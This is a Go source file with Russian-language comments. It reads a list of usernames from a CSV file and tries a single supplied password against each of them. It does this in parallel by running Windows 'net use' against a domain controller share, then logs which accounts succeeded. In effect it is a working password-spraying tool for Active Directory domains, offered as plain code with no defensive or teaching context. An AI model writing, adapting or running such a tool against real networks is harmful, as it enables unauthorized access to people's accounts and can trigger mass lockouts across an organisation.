package main

import (
	"encoding/csv"
	"fmt"
	"os"
	"os/exec"
	"sync"
)

func main() {
	// Ввод пароля
	fmt.Print("Введите пароль для подключения: ")
	var password string
	fmt.Scan(&password)

	// Ввод пути к CSV-файлу
	fmt.Print("Введите путь к CSV-файлу: ")
	var csvFilePath string
	fmt.Scan(&csvFilePath)

	users, err := readUsersFromCSV(csvFilePath)
	if err != nil {
		fmt.Println("Ошибка чтения CSV-файла:", err)
		return
	}

	var wg sync.WaitGroup
	jobs := make(chan string, len(users))
	results := make(chan Result, len(users))

	// Запуск горутин для обработки пользователей
	for i := 0; i < 10; i++ { // Количество горутин
		wg.Add(1)
		go processUsers(jobs, results, password, &wg)
	}

	// Отправка задач в канал jobs
	for _, user := range users {
		jobs <- user
	}
	close(jobs)

	// Ожидание завершения обработки
	wg.Wait()
	close(results)

	// Логирование результатов
	successLogFile, err := os.Create("success_log.txt")
	if err != nil {
		fmt.Println("Ошибка создания файла журнала успехов:", err)
		return
	}
	defer successLogFile.Close()

	failureLogFile, err := os.Create("failure_log.txt")
	if err != nil {
		fmt.Println("Ошибка создания файла журнала ошибок:", err)
		return
	}
	defer failureLogFile.Close()

	for result := range results {
		if result.Success {
			writeLog(successLogFile, result.User, result.Password, "Успех")
		} else {
			writeLog(failureLogFile, result.User, result.Password, "Неудача")
		}
	}

	fmt.Println("Завершение работы программы.")
}

type Result struct {
	User     string
	Password string
	Success  bool
}

func processUsers(jobs <-chan string, results chan<- Result, password string, wg *sync.WaitGroup) {
	defer wg.Done()
	for user := range jobs {
		fmt.Printf("Обработка пользователя: %s\n", user)

		// Форматирование логина
		login := user
		success := connectToNetworkShare(login, password)

		results <- Result{
			User:     user,
			Password: password,
			Success:  success,
		}

		clearCache()
	}
}

func readUsersFromCSV(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	reader := csv.NewReader(file)
	// Чтение данных из CSV
	records, err := reader.ReadAll()
	if err != nil {
		return nil, err
	}

	var users []string
	for _, record := range records {
		for _, field := range record {
			if field != "" {
				users = append(users, field)
			}
		}
	}

	return users, nil
}

func connectToNetworkShare(user, password string) bool {
	// Команда для подключения к сетевой папке \\dc\NETLOGON
	cmd := exec.Command("net", "use", "\\\\dc\\net", "/user:domain.local\\"+user, password)
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Ошибка подключения для пользователя %s: %v\n", user, err)
		return false
	}
	return true
}

func writeLog(file *os.File, user, password, status string) {
	message := fmt.Sprintf("Пользователь: %s, Пароль: %s, Статус: %s\n", user, password, status)
	if _, err := file.WriteString(message); err != nil {
		fmt.Println("Ошибка записи в файл журнала:", err)
	}
}

func clearCache() {
	// Команда для очистки всех подключений
	cmd := exec.Command("net", "use", "*", "/delete", "/y")
	err := cmd.Run()
	if err != nil {
		fmt.Println("Ошибка очистки кеша:", err)
	}
}
